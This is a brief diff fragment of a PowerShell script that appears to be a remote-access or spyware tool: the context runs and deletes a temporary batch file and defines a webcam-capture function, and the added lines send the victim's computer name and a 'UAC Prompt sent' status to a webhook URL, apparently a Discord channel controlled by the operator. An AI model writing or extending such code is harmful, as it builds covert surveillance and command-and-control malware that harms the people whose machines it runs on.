@@ -314,7 +314,8 @@ $tobat | Out-File -FilePath $pth -Force
 & $pth
 Sleep 7
 rm -Path $pth
-Write-Output "Done."
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``UAC Prompt sent to the current user..`` :white_check_mark:"} | ConvertTo-Json
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 }
 
 Function TakePicture {
